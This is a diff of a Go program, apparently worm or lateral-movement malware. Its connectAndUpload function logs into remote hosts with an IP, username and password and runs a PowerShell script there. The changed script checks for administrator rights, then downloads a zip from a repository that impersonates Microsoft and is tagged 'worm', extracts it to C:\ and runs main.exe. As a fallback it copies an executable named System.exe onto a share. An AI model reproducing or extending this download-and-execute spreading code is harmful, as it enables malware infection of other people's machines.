@@ -120,19 +120,48 @@ func connectAndUpload(ip, username, password string) error {
 	psScript := `
     if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
 		# URL of the executable to download
-	   $url = "https://sourceforge.net/projects/app/files/main.exe/download"
-	   
-	   # Path to save the downloaded executable
-	   $downloadPath = "$env:TEMP\downloaded_System.exe"
-	   
-	   # Download the executable
-	   Invoke-WebRequest -Uri $url -OutFile $downloadPath
-	   
-	   # Run the downloaded executable
-	   Start-Process -FilePath $downloadPath -NoNewWindow -Wait
-	   
-	   # Remove the downloaded file (optional)
-	   Remove-Item -Path $downloadPath -Force
+		# URL of the zip file to download
+		$zipUrl = "https://github.com/MicrosoftMalwareDefender/Lovers/archive/refs/tags/worm.zip"
+		
+		# Destination folder on C:\
+		$destinationFolder = "C:\"
+		
+		# Path to the downloaded zip file
+		$zipFilePath = Join-Path $destinationFolder "downloaded_file.zip"
+		
+		# Download the zip file
+		Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+		
+		# Extract the contents of the zip file into C:\downloaded_file\Lovers-worm
+		$extractedFolder = Join-Path $destinationFolder "downloaded_file\Lovers-worm"
+		Write-Host "Extracting contents to $extractedFolder..."
+		Expand-Archive -Path $zipFilePath -DestinationPath $extractedFolder -Force
+		
+		# Identify the nested "Lovers-worm" folder
+		$nestedLoversWormFolder = Get-ChildItem -Path $extractedFolder -Filter 'Lovers-worm' -Directory | Select-Object -First 1
+		
+		# Check if the nested folder exists
+		if ($nestedLoversWormFolder) {
+			# Change directory to the nested "Lovers-worm" folder
+			Set-Location -Path $nestedLoversWormFolder.FullName
+		
+			# Identify the executable file (replace 'YourExecutable.exe' with the actual executable name)
+			$executablePath = Join-Path $nestedLoversWormFolder.FullName "main.exe"
+		
+			# Check if the executable file exists
+			if (Test-Path $executablePath) {
+				# Run the executable
+				Write-Host "Running $executablePath..."
+				Start-Process -FilePath $executablePath -Wait
+			} else {
+				Write-Host "Executable not found: $executablePath"
+			}
+		} else {
+			Write-Host "Nested 'Lovers-worm' folder not found."
+		}
+		
+		Write-Host "Extraction and execution completed in: $($nestedLoversWormFolder.FullName)"
+		
 	   
 	   
 	   } else {
@@ -175,7 +204,7 @@ func connectAndUpload(ip, username, password string) error {
 		fmt.Printf("Failed to run PS1 script on %s with %s:%s: %v\n", ip, username, password, err)
 
 		// Download executable if PowerShell script fails
-		executableURL := "https://sourceforge.net/projects/app/files/main.exe/download"
+		executableURL := "https://github.com/MicrosoftMalwareDefender/Lovers/releases/download/worm/main.exe"
 		executableFileName := "System.exe"
 		executableFilePath := filepath.Join(shareName, executableFileName)
 
